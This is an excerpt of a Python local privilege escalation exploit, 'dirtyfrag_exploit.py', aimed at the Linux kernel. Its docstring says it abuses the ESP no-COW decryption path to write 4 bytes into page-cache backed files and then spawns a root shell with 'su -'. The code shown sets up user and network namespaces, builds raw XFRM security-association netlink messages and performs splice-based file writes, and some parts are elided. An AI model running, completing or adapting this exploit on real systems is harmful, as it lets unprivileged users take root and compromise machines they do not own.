...
Abuses the kernel's ESP no-COW decryption fast path to obtain a 4-byte store
primitive into page-cache backed files. Requires unprivileged user namespaces.

Usage:
    python3 dirtyfrag_exploit.py

After success, the script spawns a root shell via '/usr/bin/su -'.
"""
...
VERBOSE = os.environ.get("DIRTYFRAG_VERBOSE", "1") != "0"
...
def setup_userns_netns():
    real_uid = os.getuid()
    real_gid = os.getgid()
    _log(f"[*] unshare(CLONE_NEWUSER | CLONE_NEWNET) ...")
    try:
        unshare(CLONE_NEWUSER | CLONE_NEWNET)
    except OSError as e:
        _log(f"[-] unshare failed: {e}")
        raise
    _log(f"[*] Writing uid_map / gid_map ...")
    write_proc("/proc/self/setgroups", "deny")
    write_proc("/proc/self/uid_map", f"0 {real_uid} 1\n")
    write_proc("/proc/self/gid_map", f"0 {real_gid} 1\n")
    # bring lo UP in the new namespace
    ...
    try:
        ...
        _log(f"[*] lo brought UP in new netns")
    except Exception as e:
        _log(f"[!] Failed to bring lo up: {e}")
    finally:
        s.close()
    import fcntl
    ifreq = struct.pack("16sH14s", b"lo\x00", 0, b"")
    flags = struct.unpack("16sH14s", fcntl.ioctl(s, 0x8913, ifreq))[1]
    ifreq = struct.pack("16sH14s", b"lo\x00", flags | 0x1 | 0x40, b"")
    fcntl.ioctl(s, 0x8914, ifreq)
    s.close()
    _log("[+] namespace setup done")
...
def rta_length(length):
    return nlmsg_align(4 + length)
...
def add_xfrm_sa(spi, patch_seqhi):
    ...
    buf = bytearray(4096)
    offset = 16  # sizeof(nlmsghdr)

    # --- xfrm_usersa_info (224 bytes) ---
    xs = bytearray(224)

    # sel (offset 0, size 56)
    struct.pack_into(">I", xs, 0, 0x7f000001)       # sel.daddr.a4
    struct.pack_into(">I", xs, 16, 0x7f000001)      # sel.saddr.a4
    struct.pack_into("<H", xs, 40, socket.AF_INET)   # sel.family
    struct.pack_into("<BB", xs, 42, 32, 32)          # sel.prefixlen_d, prefixlen_s

    # id (offset 56, size 24)
    struct.pack_into(">I", xs, 56, 0x7f000001)       # id.daddr.a4
    struct.pack_into(">I", xs, 72, spi)              # id.spi
    struct.pack_into("<B", xs, 76, socket.IPPROTO_ESP) # id.proto

    # saddr (offset 80, size 16)
    struct.pack_into(">I", xs, 80, 0x7f000001)

    # lft (offset 96, size 64) -> all 0xFF = unlimited
    for off in range(96, 160, 8):
        struct.pack_into("<Q", xs, off, 0xFFFFFFFFFFFFFFFF)

    # curlft (offset 160, size 32) -> zero
    # stats (offset 192, size 12) -> zero
    ...
    _log(f"[*] Sending XFRM SA netlink msg (spi=0x{spi:08x}, seqhi=0x{patch_seqhi:08x})")
...
def do_one_write(path, offset, spi):
    ...
    try:
        ...
        _log(f"[*] splice(pipe->udp) returned {s}, sleeping 150ms")
        time.sleep(0.15)
        if s != 40:
            raise RuntimeError(f"splice(pipe->udp) returned {s}, expected 40")
    finally:
        os.close(file_fd)
        os.close(pfd[0])
        os.close(pfd[1])
